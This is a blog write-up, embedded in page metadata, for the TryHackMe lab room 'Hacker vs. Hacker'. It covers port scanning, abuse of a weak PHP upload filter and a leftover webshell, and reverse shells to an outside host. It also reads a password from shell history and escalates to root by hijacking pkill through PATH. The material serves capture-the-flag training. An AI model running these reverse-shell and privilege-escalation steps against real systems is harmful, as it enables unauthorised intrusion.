<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="📆 22/08/2022 - geobour98 ⌚ 8 min
Introduction This is a TryHackMe room which can be found at: Hacker vs. Hacker
Someone has compromised this server already! Can you get in and evade their countermeasures?
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/hackervshacker/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=logo.png><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - Hacker vs. Hacker"><meta property="og:description" content="📆 22/08/2022 - geobour98 ⌚ 8 min
Introduction This is a TryHackMe room which can be found at: Hacker vs. Hacker
Someone has compromised this server already! Can you get in and evade their countermeasures?
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/hackervshacker/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - Hacker vs. Hacker"><meta name=twitter:description content="📆 22/08/2022 - geobour98 ⌚ 8 min
Introduction This is a TryHackMe room which can be found at: Hacker vs. Hacker
Someone has compromised this server already! Can you get in and evade their countermeasures?
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - Hacker vs. Hacker","item":"https://geobour98.com/write-ups/thm/hackervshacker/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Hacker vs. Hacker","name":"TryHackMe - Hacker vs. Hacker","description":"📆 22/08/2022 - geobour98 ⌚ 8 min\nIntroduction This is a TryHackMe room which can be found at: Hacker vs. Hacker\nSomeone has compromised this server already! Can you get in and evade their countermeasures?\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10.","keywords":[],"articleBody":"📆 22/08/2022 - geobour98 ⌚ 8 min\nIntroduction This is a TryHackMe room which can be found at: Hacker vs. Hacker\nSomeone has compromised this server already! Can you get in and evade their countermeasures?\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10.10.156.143 [2 ports] Completed Ping Scan at 21:48, 0.10s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:48 Completed Parallel DNS resolution of 1 host. at 21:48, 0.00s elapsed Initiating Connect Scan at 21:48 Scanning 10.10.156.143 (10.10.156.143) [65535 ports] Discovered open port 22/tcp on 10.10.156.143 Discovered open port 80/tcp on 10.10.156.143 Connect Scan Timing: About 39.43% done; ETC: 21:49 (0:00:48 remaining) Completed Connect Scan at 21:49, 75.01s elapsed (65535 total ports) Nmap scan report for 10.10.156.143 (10.10.156.143) Host is up (0.065s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 75.16 seconds   Command: sudo nmap -A -p 22,80 -v 10.10.156.143  geobour98@kali:~$ sudo nmap -A -p 22,80 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:50 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating Parallel DNS resolution of 1 host. at 21:50 Completed Parallel DNS resolution of 1 host. at 21:50, 0.00s elapsed Initiating SYN Stealth Scan at 21:50 Scanning 10.10.156.143 (10.10.156.143) [2 ports] Discovered open port 22/tcp on 10.10.156.143 Discovered open port 80/tcp on 10.10.156.143 Completed SYN Stealth Scan at 21:50, 0.10s elapsed (2 total ports) Initiating Service scan at 21:50 Scanning 2 services on 10.10.156.143 (10.10.156.143) Completed Service scan at 21:50, 6.21s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.156.143 (10.10.156.143) Retrying OS detection (try #2) against 10.10.156.143 (10.10.156.143) Initiating Traceroute at 21:50 Completed Traceroute at 21:50, 0.08s elapsed Initiating Parallel DNS resolution of 1 host. at 21:50 Completed Parallel DNS resolution of 1 host. at 21:50, 0.00s elapsed NSE: Script scanning 10.10.156.143. Initiating NSE at 21:50 Completed NSE at 21:50, 2.99s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.27s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Nmap scan report for 10.10.156.143 (10.10.156.143) Host is up (0.066s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA) | 256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA) |_ 256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: RecruitSec: Industry Leading Infosec Recruitment | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF |_http-server-header: Apache/2.4.41 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 33.377 days (since Wed Jul 20 12:48:00 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=256 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 67.28 ms 10.8.0.1 (10.8.0.1) 2 66.56 ms 10.10.156.143 (10.10.156.143)  NSE: Script Post-scanning. Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Initiating NSE at 21:50 Completed NSE at 21:50, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds  Raw packets sent: 56 (4.084KB) | Rcvd: 40 (3.056KB)   Command: gobuster dir -u http://10.10.156.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40  geobour98@kali:~$ gobuster dir -u http://10.10.151.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.156.143/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,txt,html [+] Timeout: 10s =============================================================== 2022/08/22 21:53:10 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 278] /.htaccess.php (Status: 403) [Size: 278] /.htpasswd.php (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /.hta (Status: 403) [Size: 278] /.htpasswd.txt (Status: 403) [Size: 278] /.htaccess.txt (Status: 403) [Size: 278] /.hta.txt (Status: 403) [Size: 278] /.htpasswd.html (Status: 403) [Size: 278] /.htaccess.html (Status: 403) [Size: 278] /.hta.html (Status: 403) [Size: 278] /.hta.php (Status: 403) [Size: 278] /css (Status: 301) [Size: 312] [-- http://10.10.156.143/css/] /cvs (Status: 301) [Size: 312] [-- http://10.10.156.143/cvs/] /dist (Status: 301) [Size: 313] [-- http://10.10.156.143/dist/] /images (Status: 301) [Size: 315] [-- http://10.10.156.143/images/] /index.html (Status: 200) [Size: 3413] /index.html (Status: 200) [Size: 3413] /server-status (Status: 403) [Size: 278] /upload.php (Status: 200) [Size: 552] =============================================================== 2022/08/22 21:54:06 Finished =============================================================== After navigating to port 80 in a web browser, we see an interesting file upload functionality, but nothing happens when we try to upload a file. Then, we navigate to /upload.php and view it’s source code:\nHacked! If you dont want me to upload my shell, do better at filtering!   seriously, dumb stuff:  $target_dir = \"cvs/\"; $target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);  if (!strpos($target_file, \".pdf\")) {  echo \"Only PDF CVs are accepted.\"; } else if (file_exists($target_file)) {  echo \"This CV has already been uploaded!\"; } else if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {  echo \"Success! We will get back to you.\"; } else {  echo \"Something went wrong :|\"; }  -- Exploitation A possible vulnerability on strpos() would be to upload a file with .pdf.php extension. But this doesn’t work too. Then we search for already uploaded files with this extension in cvs/ directory.\n  Command: gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40  geobour98@kali:~$ gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.156.143/cvs/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: pdf.php [+] Timeout: 10s =============================================================== 2022/08/22 21:59:29 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 278] /.htaccess.pdf.php (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.htpasswd.pdf.php (Status: 403) [Size: 278] /.hta (Status: 403) [Size: 278] /.hta.pdf.php (Status: 403) [Size: 278] /index.html (Status: 200) [Size: 26] /shell.pdf.php (Status: 200) [Size: 18] =============================================================== 2022/08/22 21:59:57 Finished =============================================================== Just try the basic parameter cmd to check for code execution. The URL is: http://10.10.156.143/cvs/shell.pdf.php?cmd=id and we do have code execution because the output is: uid=33(www-data) gid=33(www-data) groups=33(www-data). In order to get a reverse shell, we intercept that request with Burp proxy, send it to Repeater, and execute a bash reverse shell like the following: bash -c 'exec bash -i \u0026/dev/tcp/10.8.200.50/443 , but it has to be URL-encoded. The request in Burp should look like this:\nGET /cvs/shell.pdf.php?cmd=bash+-c+'exec+bash+-i+%26/dev/tcp/10.8.200.50/443+Host: 10.10.186.151 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Open a netcat listener and we have reverse shell as www-data:\nwww-data@b2r:/var/www/html/cvs$ whoami www-data There is an interesting file .bash_history in user’s lachlan home directory (/home/lachlan), which contains the password of that user:\nwww-data@b2r:/home/lachlan$ cat .bash_history ./cve.sh ./cve-patch.sh vi /etc/cron.d/persistence echo -e \"dHY5pzmNYoETv7SUaY\\n[REDACTED]\\n[REDACTED]\" | passwd ls -sf /dev/null /home/lachlan/.bash_history Next, we become user lachlan with the found password.\n  Command: su lachlan  We can also read the first flag, user.txt:\nlachlan@b2r:/home/lachlan$ cat user.txt thm{[REDACTED]} Privilege Escalation After using this tool https://github.com/DominicBreuker/pspy in order to monitor processes without root permissions, we identified a process pkill running without absolute path.\nlachlan@b2r:/home/lachlan$ ./pspy64 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855    ██▓███ ██████ ██▓███ ▓██ ██▓  ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒  ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░  ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░  ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░  ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒  ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░  ░░ ░ ░ ░ ░░ ▒ ▒ ░░  ░ ░ ░  ░ ░  Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2022/08/22 19:22:17 CMD: UID=0 PID=95 | 2022/08/22 19:22:17 CMD: UID=0 PID=94 | 2022/08/22 19:22:17 CMD: UID=0 PID=93 | 2022/08/22 19:22:17 CMD: UID=0 PID=911 | 2022/08/22 19:22:17 CMD: UID=0 PID=91 | 2022/08/22 19:22:17 CMD: UID=0 PID=90 | 2022/08/22 19:22:17 CMD: UID=0 PID=9 | 2022/08/22 19:22:17 CMD: UID=0 PID=89 | 2022/08/22 19:22:17 CMD: UID=0 PID=88 | 2022/08/22 19:22:17 CMD: UID=0 PID=87 | 2022/08/22 19:22:17 CMD: UID=0 PID=86 | 2022/08/22 19:22:17 CMD: UID=0 PID=85 | 2022/08/22 19:22:17 CMD: UID=0 PID=84 | 2022/08/22 19:22:17 CMD: UID=0 PID=82 | 2022/08/22 19:22:17 CMD: UID=0 PID=81 | 2022/08/22 19:22:17 CMD: UID=0 PID=806 | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --w ait-for-signal 2022/08/22 19:22:17 CMD: UID=0 PID=78 | 2022/08/22 19:22:17 CMD: UID=0 PID=779 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=77 | 2022/08/22 19:22:17 CMD: UID=0 PID=76 | 2022/08/22 19:22:17 CMD: UID=0 PID=75 | 2022/08/22 19:22:17 CMD: UID=0 PID=74 | 2022/08/22 19:22:17 CMD: UID=0 PID=73 | 2022/08/22 19:22:17 CMD: UID=0 PID=726 | /usr/bin/ssm-agent-worker 2022/08/22 19:22:17 CMD: UID=0 PID=72 | 2022/08/22 19:22:17 CMD: UID=0 PID=71 | 2022/08/22 19:22:17 CMD: UID=0 PID=709 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 2022/08/22 19:22:17 CMD: UID=0 PID=70 | 2022/08/22 19:22:17 CMD: UID=0 PID=69 | 2022/08/22 19:22:17 CMD: UID=0 PID=683 | /usr/sbin/ModemManager 2022/08/22 19:22:17 CMD: UID=0 PID=649 | /sbin/agetty -o -p -- \\u --noclear tty1 linux 2022/08/22 19:22:17 CMD: UID=0 PID=644 | /sbin/agetty -o -p -- \\u --keep-baud 115200,38400,9600 ttyS0 vt220 2022/08/22 19:22:17 CMD: UID=0 PID=633 | /usr/sbin/atd -f 2022/08/22 19:22:17 CMD: UID=0 PID=630 | /usr/lib/udisks2/udisksd 2022/08/22 19:22:17 CMD: UID=0 PID=628 | /lib/systemd/systemd-logind 2022/08/22 19:22:17 CMD: UID=0 PID=623 | /usr/lib/snapd/snapd 2022/08/22 19:22:17 CMD: UID=104 PID=619 | /usr/sbin/rsyslogd -n -iNONE 2022/08/22 19:22:17 CMD: UID=0 PID=615 | /usr/lib/policykit-1/polkitd --no-debug 2022/08/22 19:22:17 CMD: UID=0 PID=611 | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 2022/08/22 19:22:17 CMD: UID=103 PID=602 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd -activation --syslog-only 2022/08/22 19:22:17 CMD: UID=0 PID=6 | 2022/08/22 19:22:17 CMD: UID=0 PID=599 | /usr/sbin/cron -f 2022/08/22 19:22:17 CMD: UID=0 PID=593 | /usr/bin/amazon-ssm-agent 2022/08/22 19:22:17 CMD: UID=0 PID=592 | /usr/lib/accountsservice/accounts-daemon 2022/08/22 19:22:17 CMD: UID=101 PID=570 | /lib/systemd/systemd-resolved 2022/08/22 19:22:17 CMD: UID=100 PID=560 | /lib/systemd/systemd-networkd 2022/08/22 19:22:17 CMD: UID=102 PID=521 | /lib/systemd/systemd-timesyncd 2022/08/22 19:22:17 CMD: UID=0 PID=504 | 2022/08/22 19:22:17 CMD: UID=0 PID=503 | 2022/08/22 19:22:17 CMD: UID=0 PID=496 | 2022/08/22 19:22:17 CMD: UID=0 PID=494 | 2022/08/22 19:22:17 CMD: UID=0 PID=491 | 2022/08/22 19:22:17 CMD: UID=0 PID=483 | /sbin/multipathd -d -s 2022/08/22 19:22:17 CMD: UID=0 PID=482 | 2022/08/22 19:22:17 CMD: UID=0 PID=481 | 2022/08/22 19:22:17 CMD: UID=0 PID=480 | 2022/08/22 19:22:17 CMD: UID=0 PID=479 | 2022/08/22 19:22:17 CMD: UID=0 PID=4 | 2022/08/22 19:22:17 CMD: UID=0 PID=372 | /lib/systemd/systemd-udevd 2022/08/22 19:22:17 CMD: UID=0 PID=364 | 2022/08/22 19:22:17 CMD: UID=0 PID=343 | /lib/systemd/systemd-journald 2022/08/22 19:22:17 CMD: UID=0 PID=3 | 2022/08/22 19:22:17 CMD: UID=0 PID=269 | 2022/08/22 19:22:17 CMD: UID=0 PID=268 | 2022/08/22 19:22:17 CMD: UID=0 PID=2628 | /lib/systemd/systemd-udevd 2022/08/22 19:22:17 CMD: UID=0 PID=2624 | 2022/08/22 19:22:17 CMD: UID=1001 PID=2614 | ./pspy64 2022/08/22 19:22:17 CMD: UID=0 PID=2609 | /bin/sleep 51 2022/08/22 19:22:17 CMD: UID=0 PID=2608 | /bin/sleep 41 2022/08/22 19:22:17 CMD: UID=0 PID=2607 | /bin/sh -c /bin/sleep 51 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2606 | /bin/sleep 31 2022/08/22 19:22:17 CMD: UID=0 PID=2605 | /bin/sleep 21 2022/08/22 19:22:17 CMD: UID=0 PID=2602 | /bin/sh -c /bin/sleep 41 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2601 | /bin/sh -c /bin/sleep 31 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2600 | /bin/sh -c /bin/sleep 21 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2595 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=0 PID=2594 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=0 PID=2593 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=0 PID=2592 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=1001 PID=2455 | sh 2022/08/22 19:22:17 CMD: UID=0 PID=2452 | 2022/08/22 19:22:17 CMD: UID=1001 PID=2449 | (sd-pam) 2022/08/22 19:22:17 CMD: UID=1001 PID=2448 | /lib/systemd/systemd --user 2022/08/22 19:22:17 CMD: UID=33 PID=2436 | su lachlan 2022/08/22 19:22:17 CMD: UID=0 PID=23 | 2022/08/22 19:22:17 CMD: UID=0 PID=224 | 2022/08/22 19:22:17 CMD: UID=0 PID=22 | 2022/08/22 19:22:17 CMD: UID=0 PID=21 | 2022/08/22 19:22:17 CMD: UID=33 PID=2021 | bash -i 2022/08/22 19:22:17 CMD: UID=33 PID=2020 | sh -c bash -c 'exec bash -i \u0026/dev/tcp/10.8.200.50/443  2022/08/22 19:22:17 CMD: UID=0 PID=20 | 2022/08/22 19:22:17 CMD: UID=0 PID=2 | 2022/08/22 19:22:17 CMD: UID=0 PID=1993 | 2022/08/22 19:22:17 CMD: UID=0 PID=198 | 2022/08/22 19:22:17 CMD: UID=0 PID=1976 | 2022/08/22 19:22:17 CMD: UID=0 PID=19 | 2022/08/22 19:22:17 CMD: UID=0 PID=18 | 2022/08/22 19:22:17 CMD: UID=0 PID=170 | 2022/08/22 19:22:17 CMD: UID=0 PID=17 | 2022/08/22 19:22:17 CMD: UID=0 PID=16 | 2022/08/22 19:22:17 CMD: UID=0 PID=1585 | 2022/08/22 19:22:17 CMD: UID=33 PID=1536 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1534 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1533 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1515 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1514 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1500 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=15 | 2022/08/22 19:22:17 CMD: UID=33 PID=1490 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1478 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1468 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=14 | 2022/08/22 19:22:17 CMD: UID=0 PID=13 | 2022/08/22 19:22:17 CMD: UID=0 PID=120 | 2022/08/22 19:22:17 CMD: UID=0 PID=12 | 2022/08/22 19:22:17 CMD: UID=33 PID=1171 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=11 | 2022/08/22 19:22:17 CMD: UID=0 PID=107 | 2022/08/22 19:22:17 CMD: UID=0 PID=104 | 2022/08/22 19:22:17 CMD: UID=0 PID=10 | 2022/08/22 19:22:17 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity 2022/08/22 19:22:22 CMD: UID=0 PID=2632 | 2022/08/22 19:22:32 CMD: UID=0 PID=2635 | 2022/08/22 19:22:37 CMD: UID=0 PID=2636 | 2022/08/22 19:22:42 CMD: UID=0 PID=2639 | pkill -9 -t pts/ptmx 2022/08/22 19:22:52 CMD: UID=0 PID=2642 | 2022/08/22 19:23:01 CMD: UID=0 PID=2648 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2647 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2646 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2645 | /usr/sbin/cron -f 2022/08/22 19:23:01 CMD: UID=0 PID=2644 | /usr/sbin/cron -f 2022/08/22 19:23:01 CMD: UID=0 PID=2643 | /usr/sbin/cron -f 2022/08/22 19:23:01 CMD: UID=0 PID=2650 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2649 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2651 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2652 | /bin/sh -c /bin/sleep 11 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2654 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2653 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2655 | /bin/sh -c /bin/sleep 1 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2656 | /bin/sh -c /bin/sleep 21 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2657 | /bin/sh -c /bin/sleep 41 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2659 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2658 | /bin/sh -c /bin/sleep 31 \u0026\u0026 for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope  /dev/pts/$f \u0026\u0026 pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2660 | /bin/sleep 51 2022/08/22 19:23:02 CMD: UID=0 PID=2663 | pkill -9 -t pts/ptmx Then we can modify PATH variable, in order to prepend /home/lachlan/bin, so we can create a malicious file named pkill, which will be executed from our location first.\nlachlan@b2r:/home/lachlan/bin$ export PATH=/home/lachlan/bin:$PATH lachlan@b2r:/home/lachlan/bin$ echo $PATH /home/lachlan/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin lachlan@b2r:/home/lachlan/bin$ echo \"bash -c 'exec bash -i \u0026/dev/tcp/10.8.200.50/444   pkill Then open another netcat listener and after a while the process pkill is executed with our file we get a root reverse shell.\nroot@b2r:~# cat root.txt thm{[REDACTED]} Proof of Concept (PoC image): ","wordCount":"2739","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/hackervshacker/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body 